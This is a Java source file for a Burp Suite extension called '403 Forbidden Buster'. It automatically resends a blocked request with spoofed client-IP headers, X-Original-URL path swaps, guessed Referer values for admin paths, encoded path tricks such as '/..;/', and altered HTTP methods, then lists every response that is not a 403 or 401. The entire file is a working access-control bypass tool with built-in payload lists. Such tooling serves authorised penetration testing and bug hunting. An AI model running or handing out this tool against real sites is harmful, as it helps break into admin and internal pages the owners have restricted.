package com.bughunter;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.ui.UserInterface;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider {

    private MontoyaApi api;
    private final BypassTableModel tableModel = new BypassTableModel();
    private final ExecutorService executor = Executors.newFixedThreadPool(5);
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;

    // --- 1. BYPASS HEADERS ---
    private static final List<String> BYPASS_HEADERS = Arrays.asList(
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-For", "X-Forwarded-Host",
            "X-Host", "X-Custom-IP-Authorization", "Client-IP", "X-Remote-IP",
            "X-Originating-IP", "Fastly-Client-IP", "True-Client-IP",
            "Referer"
    );

    // --- 2. IP SPOOFING ---
    private static final List<String> IP_PAYLOADS = Arrays.asList(
            "127.0.0.1", "localhost", "0.0.0.0", "192.168.0.1", "10.0.0.1"
    );

    // --- 3. PATH FUZZING ---
    private static final List<String> PATH_PAYLOADS = Arrays.asList(
            "/.", "//", "/./", "/;", "/.;", "//;", "/..;/", "/%2e/", "/%2f", "/admin/."
    );

    // --- 4. NEW: REFERER GUESS LIST (Add more here!) ---
    private static final List<String> REFERER_GUESSES = Arrays.asList(
            "/",                // Root (Most common bypass)
            "/admin",           // Standard Admin
            "/dashboard",       // Dashboards
            "/login",           // Login pages
            "/panel",           // Control panels
            "/console",         // Management consoles
            "/manager",         // Tomcat/JBoss styles
            "/administrator",   // CMS styles (Joomla/WordPress)
            "/private",         // Generic private
            "/internal",        // Generic internal
            "/sysadmin",        // System admin
            "/auth"             // Authentication portals
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("403 Forbidden Buster (Dictionary)");

        SwingUtilities.invokeLater(() -> {
            JTable table = new JTable(tableModel);
            table.setFont(new Font("SansSerif", Font.PLAIN, 12));
            table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);

            UserInterface ui = api.userInterface();
            requestViewer = ui.createHttpRequestEditor(EditorOptions.READ_ONLY);
            responseViewer = ui.createHttpResponseEditor(EditorOptions.READ_ONLY);

            table.getSelectionModel().addListSelectionListener(e -> {
                if (!e.getValueIsAdjusting()) {
                    int selectedRow = table.getSelectedRow();
                    if (selectedRow != -1) {
                        BypassResult result = tableModel.getResult(selectedRow);
                        requestViewer.setRequest(result.requestResponse.request());
                        responseViewer.setResponse(result.requestResponse.response());
                    } else {
                        requestViewer.setRequest(null);
                        responseViewer.setResponse(null);
                    }
                }
            });

            JPopupMenu popupMenu = new JPopupMenu();
            JMenuItem deleteItem = new JMenuItem("Delete Item");
            JMenuItem clearItem = new JMenuItem("Clear History");

            deleteItem.addActionListener(e -> {
                int selectedRow = table.getSelectedRow();
                if (selectedRow != -1) tableModel.removeRow(selectedRow);
            });
            clearItem.addActionListener(e -> tableModel.clear());
            popupMenu.add(deleteItem);
            popupMenu.addSeparator();
            popupMenu.add(clearItem);

            table.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseReleased(MouseEvent e) { handleContextMenu(e); }
                @Override
                public void mousePressed(MouseEvent e) { handleContextMenu(e); }
                private void handleContextMenu(MouseEvent e) {
                    if (e.isPopupTrigger()) {
                        int row = table.rowAtPoint(e.getPoint());
                        if (row != -1 && !table.isRowSelected(row)) {
                            table.setRowSelectionInterval(row, row);
                        }
                        popupMenu.show(e.getComponent(), e.getX(), e.getY());
                    }
                }
            });

            JScrollPane tableScroll = new JScrollPane(table);
            JSplitPane bottomSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, requestViewer.uiComponent(), responseViewer.uiComponent());
            bottomSplit.setResizeWeight(0.5);
            JSplitPane mainSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, bottomSplit);
            mainSplit.setResizeWeight(0.3);

            api.userInterface().registerSuiteTab("403 Buster", mainSplit);
        });

        api.userInterface().registerContextMenuItemsProvider(this);
        api.logging().logToOutput("403 Buster Loaded. Loaded " + REFERER_GUESSES.size() + " Referer Payloads.");
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        if (event.messageEditorRequestResponse().isEmpty()) return null;
        JMenuItem bypassItem = new JMenuItem("Bypass 403 Forbidden");
        MessageEditorHttpRequestResponse editor = event.messageEditorRequestResponse().get();
        bypassItem.addActionListener(l -> executor.submit(() -> startAttack(editor.requestResponse())));
        List<Component> menuList = new ArrayList<>();
        menuList.add(bypassItem);
        return menuList;
    }

    private void startAttack(HttpRequestResponse baseRequestResponse) {
        HttpRequest originalRequest = baseRequestResponse.request();
        String originalPath = originalRequest.path();

        String host = baseRequestResponse.httpService().host();
        boolean isSecure = baseRequestResponse.httpService().secure();
        String scheme = isSecure ? "https://" : "http://";

        api.logging().logToOutput("[-] Starting fuzzing for: " + originalPath);

        // 1. Header Fuzzing
        for (String header : BYPASS_HEADERS) {

            // A. IP Injection
            for (String ip : IP_PAYLOADS) {
                HttpRequest newReq = originalRequest.withHeader(HttpHeader.httpHeader(header, ip));
                sendAndLog(newReq, "Header: " + header, baseRequestResponse);
            }

            // B. Path Swapping
            if (header.contains("URL")) {
                HttpRequest swapReq = originalRequest
                        .withPath("/")
                        .withHeader(HttpHeader.httpHeader(header, originalPath));
                checkPathSwap(swapReq, "Path Swap: / + " + header, originalRequest.withPath("/"));
            }

            // C. Referer Logic (Dynamic + Dictionary)
            if (header.equalsIgnoreCase("Referer")) {
                List<String> refererCandidates = new ArrayList<>();

                // 1. Self-Reference
                refererCandidates.add(scheme + host + originalPath);

                // 2. Directory Walking (Dynamic Parents)
                String tempPath = originalPath;
                while (tempPath.lastIndexOf("/") > 0) {
                    tempPath = tempPath.substring(0, tempPath.lastIndexOf("/"));
                    refererCandidates.add(scheme + host + tempPath);
                }

                // 3. Dictionary List (Static Guesses)
                // This uses the list we defined at the top
                for (String parent : REFERER_GUESSES) {
                    refererCandidates.add(scheme + host + parent);
                }

                // Execute Referer Fuzzing
                for (String refUrl : refererCandidates) {
                    HttpRequest refReq = originalRequest.withHeader(HttpHeader.httpHeader(header, refUrl));
                    // Clean up description for UI
                    String shortDesc = "Referer: " + refUrl.replace(scheme + host, "");
                    sendAndLog(refReq, shortDesc, baseRequestResponse);
                }
            }
        }

        // 2. Path Manipulation
        for (String payload : PATH_PAYLOADS) {
            if (payload.startsWith("/")) sendAndLog(originalRequest.withPath(payload + originalPath.substring(1)), "Path Prefix: " + payload, baseRequestResponse);
            sendAndLog(originalRequest.withPath(originalPath + payload), "Path Suffix: " + payload, baseRequestResponse);
        }

        // 3. Method Tampering
        sendAndLog(originalRequest.withMethod("POST").withBody(""), "Method: POST", baseRequestResponse);
        sendAndLog(originalRequest.withMethod("TRACE"), "Method: TRACE", baseRequestResponse);
        sendAndLog(originalRequest.withMethod("HEAD"), "Method: HEAD", baseRequestResponse);
    }

    private void checkPathSwap(HttpRequest attackReq, String description, HttpRequest baselineReq) {
        try {
            HttpRequestResponse attackResponse = api.http().sendRequest(attackReq);
            short statusCode = attackResponse.response().statusCode();
            if (statusCode == 200 || statusCode == 302) {
                HttpRequestResponse baselineResponse = api.http().sendRequest(baselineReq);
                int attackLen = attackResponse.response().body().length();
                int baselineLen = baselineResponse.response().body().length();
                if (Math.abs(attackLen - baselineLen) < 100) return;
                SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
                        attackReq.method(), attackReq.url(), description, statusCode, attackLen, attackResponse
                )));
            }
        } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
    }

    private void sendAndLog(HttpRequest request, String description, HttpRequestResponse original) {
        try {
            HttpRequestResponse response = api.http().sendRequest(request);
            short statusCode = response.response().statusCode();
            int length = response.response().bodyToString().length();
            if (statusCode != 403 && statusCode != 401) {
                SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
                        request.method(), request.url(), description, statusCode, length, response
                )));
            }
        } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
    }

    static class BypassTableModel extends AbstractTableModel {
        private final List<BypassResult> results = new ArrayList<>();
        private final String[] columns = {"Method", "URL", "Technique", "Status", "Length"};
        public void addResult(BypassResult result) { results.add(result); fireTableRowsInserted(results.size() - 1, results.size() - 1); }
        public void clear() { results.clear(); fireTableDataChanged(); }
        public void removeRow(int rowIndex) { if (rowIndex >= 0 && rowIndex < results.size()) { results.remove(rowIndex); fireTableRowsDeleted(rowIndex, rowIndex); } }
        public BypassResult getResult(int rowIndex) { return results.get(rowIndex); }
        @Override public int getRowCount() { return results.size(); }
        @Override public int getColumnCount() { return columns.length; }
        @Override public String getColumnName(int column) { return columns[column]; }
        @Override public Object getValueAt(int rowIndex, int columnIndex) {
            BypassResult result = results.get(rowIndex);
            switch (columnIndex) {
                case 0: return result.method;
                case 1: return result.url;
                case 2: return result.technique;
                case 3: return result.status;
                case 4: return result.length;
                default: return "";
            }
        }
    }

    static class BypassResult {
        String method, url, technique;
        int status, length;
        HttpRequestResponse requestResponse;
        public BypassResult(String method, String url, String technique, int status, int length, HttpRequestResponse requestResponse) {
            this.method = method; this.url = url; this.technique = technique; this.status = status; this.length = length; this.requestResponse = requestResponse;
        }
    }
}